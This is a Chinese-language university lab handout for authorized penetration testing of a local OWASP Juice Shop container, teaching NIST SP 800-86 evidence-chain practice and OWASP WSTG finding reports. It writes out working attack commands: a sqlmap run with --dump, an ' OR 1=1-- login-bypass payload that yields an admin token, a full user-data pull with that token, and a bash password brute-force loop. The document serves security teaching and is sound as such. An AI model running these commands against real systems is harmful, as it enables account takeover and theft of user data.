# Week 14 — 容器滲透 × 鑑識證據鏈

**日期**：2026/06/01–06/07
**時長**：3 小時（180 分鐘）
**主題**：對 Juice Shop 進行授權滲透，並依 [NIST SP 800-86](https://csrc.nist.gov/publications/detail/sp/800-86/final) 建立完整鑑識證據鏈
**目標系統**：[OWASP Juice Shop](https://github.com/juice-shop/juice-shop)（Docker 容器）

[TOC]

---

## 引言：為什麼是今天？

[OWASP Top 10 2025](https://owasp.org/Top10/) 剛出爐：**A01 Broken Access Control 連續蟬聯第一**，測試資料顯示 **100% 的應用程式**都存在某種 access control 問題。不是 90%，是 100%。

這週兩個真實 CVE 進一步說明這件事不只是排行榜數字——

---

### [A01:2025 — Broken Access Control](https://owasp.org/Top10/A01_2025-Broken_Access_Control/) 仍是 OWASP Top 10 第一名

> 今天你們在 Juice Shop 改 basket、看別人訂單、繞過權限，看起來像 CTF；但 OWASP 2025 仍把 Broken Access Control 放第一名，表示這不是玩具漏洞，而是最常見、最實際的 Web AppSec 問題之一。

| Juice Shop 類型 | 真實風險 |
|----------------|---------|
| 查看他人 basket | IDOR / horizontal privilege escalation |
| 存取 admin function | Vertical privilege escalation |
| 未授權 API 呼叫 | Missing server-side authorization |
| 操作他人資料 | Broken object-level authorization |

---

### [CVE-2025-54236](https://nvd.nist.gov/vuln/detail/CVE-2025-54236) — Adobe Commerce / Magento：SessionReaper

Adobe Commerce 與 Magento Open Source 存在 **Improper Input Validation**，攻擊者可透過 Web API 達成 **session takeover**，不需要使用者互動。[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-54236) 的 CVSS v3.1 向量顯示：網路可利用、低複雜度、不需任何權限。

兩者都是電商情境——Juice Shop 是縮小版的練習場，Magento 是真實的生產環境。漏洞類型幾乎相同。

| Juice Shop Lab | 對應真實風險 |
|----------------|------------|
| Broken Authentication | Session takeover |
| API input validation | REST API 驗證失敗 |
| E-commerce threat model | 客戶帳號、訂單、付款資料 |
| Evidence chain | request / response、時間戳、log、hash |

**課堂討論**：如果你在 Juice Shop 找到一個能改別人 basket 或 session 的漏洞，Finding 嚴重度應該怎麼評？它和 Magento SessionReaper 有什麼共同點？

---

### [CVE-2026-26980](https://nvd.nist.gov/vuln/detail/CVE-2026-26980) — Ghost CMS：Content API SQL Injection

Ghost CMS 3.24.0 到 6.19.0 的 Content API 存在 **unauthenticated SQL injection**，攻擊者無需認證即可透過 API filter 參數讀取資料庫內容，修補版本為 6.19.1。

> SQL injection 不是 2000 年代的老問題，它在 2026 年仍然能出現在現代 CMS 的 API 裡。

| Juice Shop Lab | 對應真實風險 |
|----------------|------------|
| SQL Injection on login | Content API SQLi |
| Sensitive data exposure | 任意資料庫讀取 |
| API security | API filter / parameter handling |
| Evidence preservation | payload 不必展示攻擊細節，保留 request / response 與 hash 即可 |

**課堂討論**：在 Finding 裡，SQLi 的證據要證明什麼？是「我能 dump 整個 DB」，還是「未授權查詢可以改變資料庫回應」就足夠？

引導方向：Pentest 報告不需要過度擷取資料；**最小侵入證據**能證明風險即可，這也是 [NIST SP 800-86](https://csrc.nist.gov/publications/detail/sp/800-86/final) 對比例原則的要求。

---

## 一、課程目標

完成本課後，學生應能：

1. 說明 NIST SP 800-86 對證據完整性、可追溯性的核心要求
2. 用 `nikto` 和 `sqlmap` 對 Juice Shop 進行授權滲透並自動化記錄全程
3. 對每份工具輸出，在取得後**立即**補齊 When / Where / Who / How / What / Integrity 六個欄位
4. 維護一份符合 NIST 規範的 `EVIDENCE_INDEX.md`，可獨立驗證所有 SHA-256
5. 依 OWASP WSTG 報告格式，把技術發現轉成兼顧業務風險的 Finding 單

---

## 二、認識 Juice Shop 容器

### 2.1 它是什麼？

[OWASP Juice Shop](https://github.com/juice-shop/juice-shop) 是一家「故意有漏洞的線上飲料商店」，由 OWASP 維護，是目前**練習 Web 滲透測試最廣泛使用的靶機**之一。

> *「It is probably the most modern and sophisticated insecure web application!」— OWASP*

它被設計成真實的現代電商網站，而不是玩具環境：有完整的購物流程、會員登入、訂單管理、評論系統，以及一個挑戰計分板。漏洞被刻意**藏在正常的業務功能裡**，這是它的教學價值所在。

### 2.2 技術架構

```
┌─────────────────────────────────────────┐
│  Docker Container: juice-shop:latest    │
│                                         │
│  ┌─────────────────────────────────┐    │
│  │  Frontend: Angular SPA          │    │
│  │  (Single Page Application)      │    │
│  └────────────┬────────────────────┘    │
│               │ REST API / GraphQL      │
│  ┌────────────▼────────────────────┐    │
│  │  Backend: Node.js + Express     │    │
│  │  Port 3000                      │    │
│  └────────────┬────────────────────┘    │
│               │                         │
│  ┌────────────▼────────────────────┐    │
│  │  Database: SQLite               │    │
│  │  (存放用戶、訂單、挑戰狀態)       │    │
│  └─────────────────────────────────┘    │
└─────────────────────────────────────────┘
         ↕ port 3000
  Kali Linux (攻擊端)
```

| 組件 | 細節 |
|------|------|
| 前端 | Angular 14+，SPA 架構，JS 前端有很多彩蛋 |
| 後端 | Node.js + Express，REST API + 少量 GraphQL |
| 資料庫 | SQLite（單一 .sqlite 檔），不需額外 DB 服務 |
| 容器 | `bkimminich/juice-shop:latest`，約 400 MB |
| 帳號 | 預設無需建立——開啟就有示範用戶資料 |

### 2.3 為什麼用 Docker？

1. **環境隔離**：不影響 Kali 本機服務，用完直接 `docker rm`
2. **可重現**：所有學生的靶機狀態相同，確保 Finding 可比較
3. **NIST 視角**：Docker container 有明確的 image SHA，符合「已知且受控的測試環境」要求

```bash
# 查看 container 的 image SHA（記錄在 NIST 文件裡的 "Where"）
docker inspect juice-shop --format '{{.Image}}'
# 輸出範例：sha256:3f4a7...
```

### 2.4 今天鎖定的三個漏洞

Juice Shop 有 100+ 個挑戰，我們今天只打這三個，原因是它們**形成一條攻擊鏈**：

```
[Lab 2] SQL Injection on /rest/user/login
    ↓
 取得 admin JWT token（不需知道密碼）
    ↓
[Lab 3] Broken Access Control on /api/Users
    ↓
 撈出全部用戶資料（email、雜湊密碼）
    ↓
[Lab 4] Brute Force on /rest/user/login
    ↓
 獨立確認：弱密碼讓 SQLi 之外也有入口
```

| Lab | 端點 | OWASP 分類 | 對應挑戰 |
|-----|------|------------|---------|
| 2 | `POST /rest/user/login` | A03 Injection | *Login Admin* |
| 3 | `GET /api/Users` | A01 Broken Access Control | *User Credentials* |
| 4 | `POST /rest/user/login` | A07 Auth Failure | *Password Strength* |

### 2.5 挑戰計分板（Scorecard）

Juice Shop 有一個隱藏的計分板，可確認挑戰是否成功觸發：

```
http://localhost:3000/#/score-board
```

當你看到挑戰旁邊出現 🏆 旗幟，代表 Juice Shop 內部確認了攻擊成功。這可以作為**額外的 What 證據**（螢幕截圖 + 計分板 URL + 時間戳）。

> **教師提示**：進入計分板需要先造訪 `http://localhost:3000/#/score-board`（它本身就是一個隱藏挑戰）。可以在 Lab 開始前先帶學生看一遍，讓他們知道攻擊成功長什麼樣子。

---

## 三、為什麼今天的主軸是「保存證據」

### 3.1 [NIST SP 800-86](https://csrc.nist.gov/publications/detail/sp/800-86/final) 的立場

> *Guide to Integrating Forensic Techniques into Incident Response*（2006，仍是現行標準）

NIST 強調這份指引**不是只給執法單位**，而是給所有需要處理數位證據的 IT 人員：

| NIST 要求 | 在 pentest 的意義 |
|-----------|-----------------|
| 證據完整性（Integrity）| 工具輸出不可被事後竄改，SHA-256 是最低要求 |
| 可追溯性（Traceability）| 誰、用什麼工具、什麼時間、對哪個端點 |
| 重現性（Reproducibility）| 客戶或第三方可以用同樣的步驟得到同樣的結果 |
| 文件化（Documentation）| 每個動作都要留書面記錄，不能只靠記憶 |

### 3.2 [OWASP WSTG](https://owasp.org/www-project-web-security-testing-guide/) 的立場

[Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) 指出：
> *「技術測試只是 assessment 的一半，另一半是清楚的報告。沒有清楚的報告，測試就沒有商業價值。」*

Finding 單不只是技術描述，要包含**業務影響**——客戶的管理階層要看得懂。

### 3.3 今天的 5W1H + Integrity 框架

每一份證據，都要回答這六個問題：

| 問題 | 要保存的內容 | 對應 NIST |
|------|------------|----------|
| **When** | 發現時間（UTC）、系統時區 | Traceability |
| **Where** | URL、API endpoint、Docker container ID | Traceability |
| **Who** | 操作者、工具名稱、工具版本 | Traceability |
| **How** | 完整指令、payload、wordlist 名稱 | Reproducibility |
| **What** | 原始回應、HTTP response、log 內容 | Documentation |
| **Integrity** | SHA-256、不可變檔名（含 timestamp）、EVIDENCE_INDEX | Integrity |

---

## 四、時間配置

| 時間 | 內容 |
|------|------|
| 0:00–0:20 | 環境確認 + 載入自製 evidence 腳本 + Session 初始化 |
| 0:20–0:50 | Lab 1：nikto + 5W1H 證據收集 |
| 0:50–1:25 | Lab 2：sqlmap SQL Injection + 5W1H 證據收集 |
| 1:25–1:55 | Lab 3：API 存取控制繞過 + 5W1H 證據收集 |
| 1:55–2:25 | Lab 4：暴力破解 admin 密碼 + 5W1H 證據收集 |
| 2:25–2:55 | Lab 5：EVIDENCE_INDEX 驗證 + WSTG Finding 單 |
| 2:55–3:00 | 繳交確認 |

---

## 五、環境設定（0:00–0:20）

### 4.1 教師課前執行

```bash
sudo bash setup.sh
```

### 4.2 學生：建立 Pentest 工作目錄

```bash
export PENTEST_DIR="$HOME/pentest/week14"
mkdir -p "$PENTEST_DIR"/{evidence,logs,reports}
cd "$PENTEST_DIR"
```

### 4.3 載入你自己的 Evidence 腳本

> **課前作業**：請依 [evidence-guidelines.md](evidence-guidelines.md) 的規格書，自行實作一份 `evidence_<學號>.sh`，
> 上課前一天繳交，課堂直接使用。

```bash
source ~/labs/week14/evidence_<學號>.sh
# 你的腳本應在載入時印出確認訊息，例如：
# [ev] evidence.sh 載入完成
# [ev] 函式：ev_start / ev_cmd / ev_end / ev_hash
```

若腳本在課堂執行時有 bug，你仍須完成所有 Lab——屆時可向助教借用備用腳本，但作業分數會依規格驗收結果計算。

### 4.4 啟動 Session 完整記錄

```bash
script -q -t 2>logs/timing_$(date +%Y%m%d_%H%M%S).log \
  logs/session_$(date +%Y%m%d_%H%M%S).log

# 再次載入（script 開了新的 shell）
source ~/labs/week14/evidence_<學號>.sh
export PENTEST_DIR="$HOME/pentest/week14"
cd "$PENTEST_DIR"

# 寫入起始資訊（進入 NIST 記錄範圍）
cat << INFO
=== Pentest Session Start ===
Tester   : $(whoami)@$(hostname)
Time UTC : $(date -u '+%Y-%m-%dT%H:%M:%SZ')
Target   : http://localhost:3000
Scope    : authorized pentest (SoW: WK14-2026)
=============================
INFO
```

### 4.5 確認 Juice Shop 存活

```bash
curl -s -o /dev/null -w "Juice Shop: HTTP %{http_code}\n" http://localhost:3000
# 預期：HTTP 200
```

---

## 六、Lab 1 — nikto 黑箱掃描（0:20–0:50）

### 學習重點

nikto 是**主動掃描**，它會測試伺服器版本、HTTP 安全標頭、常見漏洞路徑。

今天的重點不是「nikto 找到什麼」，而是「怎麼讓 nikto 的結果成為符合 NIST 的證據」。

### Step 1：ev_start — 記錄 When / Where / Who

```bash
ev_start "nikto" "http://localhost:3000" "initial black-box web vulnerability scan"
# EV_DIR 和 EV_RAW 環境變數已自動設好
```

### Step 2：ev_cmd — 記錄 How（在執行前）

```bash
ev_cmd "nikto -h http://localhost:3000 -Tuning b234 -timeout 3 -maxtime 5m -output $EV_RAW -Format txt"
```

### Step 3：執行 nikto — 產生 What

```bash
nikto -h http://localhost:3000 \
  -Tuning b234 \
  -timeout 3 \
  -maxtime 5m \
  -output "$EV_RAW" \
  -Format txt

echo "[+] nikto 完成"
```

> `-Tuning b234`：只跑 Software Identification、Misconfiguration、Information Disclosure、Injection 四類，排除對 Juice Shop 無意義的測試。`-maxtime 5m` 確保最多 5 分鐘結束，無論掃描進度如何。

**nikto 的每一行 `+` 開頭輸出都是一個潛在發現**，但它是工具的判斷，不是你的判斷。你的工作是：
1. 保存原始輸出（What）
2. 記錄 metadata（When/Where/Who/How）
3. 計算 SHA-256（Integrity）
4. 然後自己判斷哪些值得寫進 Finding 單

### Step 4：ev_end — 記錄 Integrity（SHA-256）

```bash
ev_end
```

`ev_end` 會自動：
- 補上 `end_utc` 到 `metadata.json`
- 對 `raw_output.txt` 和 `metadata.json` 計算 SHA-256
- 把這筆記錄寫入 `EVIDENCE_INDEX.md`

### Step 5：檢視發現

```bash
echo "=== nikto 主要發現 ==="
grep "^+" "$EV_RAW" | head -20
```

**記下觀察**（Finding 單 #1 素材）：
- 有沒有揭露 Express/Node.js 版本？（Where + What）
- HTTP 安全標頭缺少哪些？（What）
- 有沒有任何可疑路徑？（Where）

---

## 七、Lab 2 — sqlmap SQL Injection（0:50–1:25）

### 學習重點

sqlmap `--batch` 完全不需要人工介入，但它產生的是**整個目錄**而不是單一檔案。
ev_end 會用 `find` 對目錄裡所有檔案計算 SHA-256。

> **對 Docker 靶機要溫柔**：`--technique=BEUS` 限制只用 Boolean-based、Error-based、Union-based、Stacked 四種注入手法（排除時間盲注），`--risk=1 --threads=1` 降低 payload 激進程度與並發數，避免 Juice Shop container OOM 崩潰。這是真實 pentest 的正確做法——不能把目標打掛。

### Step 1：ev_start

```bash
ev_start "sqlmap" \
  "http://localhost:3000/rest/user/login" \
  "SQL injection test on login endpoint; aiming to bypass auth and dump credentials"
```

### Step 2：ev_cmd

```bash
SQLMAP_OUT="$EV_DIR/sqlmap_output"
ev_cmd "sqlmap -u http://localhost:3000/rest/user/login --data '{\"email\":\"*\",\"password\":\"x\"}' --content-type application/json --dbms sqlite --technique=BEUS --risk=1 --threads=1 --batch --dump --output-dir $SQLMAP_OUT"
```

### Step 3：執行 sqlmap

```bash
sqlmap \
  -u "http://localhost:3000/rest/user/login" \
  --data='{"email":"*","password":"x"}' \
  --content-type="application/json" \
  --dbms=sqlite \
  --technique=BEUS \
  --risk=1 \
  --threads=1 \
  --batch \
  --dump \
  --output-dir="$SQLMAP_OUT" \
  2>&1 | tee "$EV_RAW"

echo "[+] sqlmap 完成"
```

### Step 4：ev_end（自動 hash 整個 sqlmap_output 目錄）

```bash
# hash sqlmap 產生的所有檔案
find "$SQLMAP_OUT" -type f 2>/dev/null | sort | while read -r f; do
  ev_hash "$f"
done

ev_end
```

### Step 5：取得 admin JWT（產生額外的 What）

```bash
ev_start "sqli_jwt" \
  "http://localhost:3000/rest/user/login" \
  "extract admin JWT via SQL injection payload: ' OR 1=1--"

ev_cmd "curl -sX POST http://localhost:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"' OR 1=1--\",\"password\":\"x\"}'"

curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"x"}' \
  | tee "$EV_RAW"

ev_end
```

### Step 6：提取並保存 JWT

```bash
JWT=$(python3 -c "
import json, glob
files = sorted(glob.glob('evidence/*sqli_jwt*/raw_output.txt'))
data = json.load(open(files[-1]))
print(data['authentication']['token'])
")

echo "JWT 前 40 字元：${JWT:0:40}..."
echo "$JWT" > logs/admin_jwt.txt
ev_hash logs/admin_jwt.txt
export JWT
```

---

## 八、Lab 3 — API 存取控制繞過（1:25–1:55）

### 學習重點

API 存取控制問題是兩個漏洞的**連鎖**：
1. SQLi（Lab 2）讓攻擊者拿到本不該有的 JWT
2. BAC（本 Lab）讓這個 JWT 可以讀取所有用戶資料

Finding 單必須把這個連鎖寫清楚——這是 OWASP WSTG 報告要求的 root cause 分析。

### Step 1：ev_start

```bash
ev_start "api_bac" \
  "http://localhost:3000/api/Users" \
  "test whether admin JWT obtained via SQLi can access all user records (IDOR/BAC)"
```

### Step 2：ev_cmd

```bash
ev_cmd "curl -s http://localhost:3000/api/Users -H 'Authorization: Bearer <jwt>'"
```

### Step 3：執行並保存原始回應（What）

```bash
curl -s http://localhost:3000/api/Users \
  -H "Authorization: Bearer $JWT" \
  | tee "$EV_RAW"

ev_end
```

### Step 4：摘要（補充 What）

```bash
ev_start "api_bac_summary" \
  "http://localhost:3000/api/Users" \
  "count and sample user records from API dump"

python3 -c "
import json
data = json.load(open('$EV_RAW'))
users = data.get('data', [])
print(f'總用戶數：{len(users)} 筆')
for u in users[:5]:
    print(f'  id={u[\"id\"]:3d}  email={u[\"email\"]}')
" | tee "$EV_RAW"

ev_end
```

### Step 5：對照：無 JWT 的結果

```bash
ev_start "api_no_auth" \
  "http://localhost:3000/api/Users" \
  "confirm endpoint returns 401 without JWT (baseline)"

ev_cmd "curl -s -o /dev/null -w 'HTTP %{http_code}' http://localhost:3000/api/Users"

curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  http://localhost:3000/api/Users \
  | tee "$EV_RAW"
# 預期：HTTP 401

ev_end
```

> 這個「有 vs 無 JWT」的對比，是 WSTG 要求的 **baseline comparison**——證明不是每個人都能存取，而是「攻擊者透過 SQLi 取得了不該有的存取權」。

---

## 九、Lab 4 — 暴力破解 admin 密碼（1:55–2:25）

### 學習重點

暴力破解是**獨立於 SQLi 的攻擊路徑**。Finding 單要說明：即使修補了 SQLi，弱密碼仍然讓 admin 帳號暴露在風險中。

### Step 1：ev_start

```bash
ev_start "bruteforce" \
  "http://localhost:3000/rest/user/login" \
  "credential brute force against admin@juice-sh.op using wordlist-top50.txt (50 passwords)"
```

### Step 2：ev_cmd

```bash
ev_cmd "curl loop: POST /rest/user/login with wordlist-top50.txt against admin@juice-sh.op"
```

### Step 3：執行暴力破解，保存每次嘗試的結果（How + What）

```bash
BRUTE_LOG="$EV_DIR/attempt_log.txt"
BRUTE_HIT="$EV_DIR/success_response.json"

{
  echo "Start: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo "Target: admin@juice-sh.op"
  echo "Wordlist: wordlist-top50.txt ($(wc -l < ~/labs/week14/wordlist-top50.txt) words)"
  echo "---"
} | tee "$BRUTE_LOG"

FOUND=0
while IFS= read -r pass; do
  response=$(curl -s -X POST http://localhost:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"${pass}\"}")

  if echo "$response" | grep -q '"token"'; then
    echo "[SUCCESS] password: $pass  time: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" \
      | tee -a "$BRUTE_LOG"
    echo "$response" > "$BRUTE_HIT"
    FOUND=1
    break
  else
    echo "[fail]    $pass" >> "$BRUTE_LOG"
  fi
done < ~/labs/week14/wordlist-top50.txt

[ "$FOUND" -eq 0 ] && echo "[-] 未找到" | tee -a "$BRUTE_LOG"

echo "End: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" >> "$BRUTE_LOG"
```

### Step 4：ev_hash + ev_end

```bash
ev_hash "$BRUTE_LOG"
[ -f "$BRUTE_HIT" ] && ev_hash "$BRUTE_HIT"

ev_end
```

---

## 十、Lab 5 — EVIDENCE_INDEX 驗證 + Finding 單（2:25–2:55）

### Step 1：結束 Session 記錄

```bash
echo "=== Pentest Session End ==="
echo "Time UTC : $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Evidence count: $(ls evidence/ | wc -l) directories"
exit   # 結束 script
```

```bash
cd "$PENTEST_DIR"
sha256sum logs/session_*.log >> logs/EVIDENCE_INDEX.md
```

### Step 2：驗證所有 SHA-256

```bash
echo "=== 完整性驗證 ==="
find evidence -name "sha256.txt" | while read -r manifest; do
  echo "--- $manifest ---"
  sha256sum -c "$manifest" 2>&1
done
# 全部 OK → 證據鏈完整，沒有被竄改
```

### Step 3：查看 EVIDENCE_INDEX

```bash
cat logs/EVIDENCE_INDEX.md
```

預期看到 6 列（nikto、sqlmap、sqli_jwt、api_bac、api_bac_summary、api_no_auth、bruteforce），每列都有 When / Where / Who / How / SHA-256。

### Step 4：撰寫 WSTG 格式 Finding 單（3 份）

```bash
cp reports/finding-template.md reports/finding-01-sqli.md
cp reports/finding-template.md reports/finding-02-bac.md
cp reports/finding-template.md reports/finding-03-bruteforce.md
```

**WSTG Finding 單的必填欄位**（與純技術報告的差異在於業務影響）：

```markdown
## Finding #01 — SQL Injection on Login Endpoint

**Risk**        : Critical
**CVSS 3.1**    : [9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**OWASP**       : [A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
**WSTG-INPV-05**: [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

### Technical Description
...（說明漏洞原理）

### Business Impact        ← WSTG 要求：管理階層要看得懂
攻擊者無需任何憑證即可取得 admin 帳號存取權，進而存取全體
客戶個資（姓名、email、訂單記錄），構成個資法第 12 條的資料外洩通知義務。

### Evidence
| # | 檔案 | SHA-256 |
|---|------|---------|
| 1 | evidence/02_sqlmap_.../raw_output.txt | `<從 sha256.txt 複製>` |
| 2 | evidence/03_sqli_jwt_.../raw_output.txt | `<從 sha256.txt 複製>` |

### Reproduction Steps     ← NIST：可重現性
1. `curl -sX POST http://target/rest/user/login -H 'Content-Type: application/json' \`
   `-d '{"email":"'"'"' OR 1=1--","password":"x"}'`
2. 回應中取得 `authentication.token`

### Remediation
1. 使用 Parameterized Query（預編譯語句）
2. 輸入驗證：email 欄位應拒絕包含單引號的輸入
3. 實作 rate limiting，防止暴力枚舉
```

| Finding | 主要證據目錄 | 嚴重度 | Business Impact |
|---------|------------|--------|----------------|
| 01-sqli | `02_sqlmap_*` + `03_sqli_jwt_*` | Critical | admin 帳號接管、全客戶資料外洩 |
| 02-bac | `05_api_bac_*` + `07_api_no_auth_*` | High | 任何有效 JWT 均可讀取全體用戶資料 |
| 03-bruteforce | `08_bruteforce_*` | High | 弱密碼讓 admin 暴露在暴力破解風險 |

---

## 十一、繳交說明

| 項目 | 要求 |
|------|------|
| Finding 單 | 3 份 Markdown，每份附 SHA-256（從 sha256.txt 複製） |
| 壓縮包 | `evidence/` + `logs/` 打包成 `.zip` |
| 驗證指令 | 助教執行 `sha256sum -c evidence/*/sha256.txt` 應全部 OK |
| 檔名 | `W14_Pentest_學號_姓名.zip` |
| 截止 | 上課當週週日 23:59 |

**評分標準**：

| 項目 | 分數 |
|------|------|
| SHA-256 可獨立驗證（`sha256sum -c` 全 OK）| 30% |
| metadata.json 包含完整 When/Where/Who/How | 30% |
| Finding 單有 Business Impact 段落 | 20% |
| 重現步驟可由助教獨立重現 | 20% |

---

## 十二、期末報告連結

```
Week 13 附錄 A → AI Agent 使用紀錄
Week 14 附錄 B → NIST SP 800-86 證據包（evidence/ + EVIDENCE_INDEX.md）
Week 14 附錄 C → OWASP WSTG Finding 單（finding-01、02、03）
```

---

## 十三、延伸閱讀

- [NIST SP 800-86 — Guide to Integrating Forensic Techniques into Incident Response](https://csrc.nist.gov/publications/detail/sp/800-86/final)
- [OWASP WSTG — Reporting](https://owasp.org/www-project-web-security-testing-guide/latest/5-Reporting/README)
- [OWASP WSTG — WSTG-INPV-05 Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [sqlmap 官方文件](https://sqlmap.org/)
- [nikto 官方文件](https://github.com/sullo/nikto/wiki)
- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
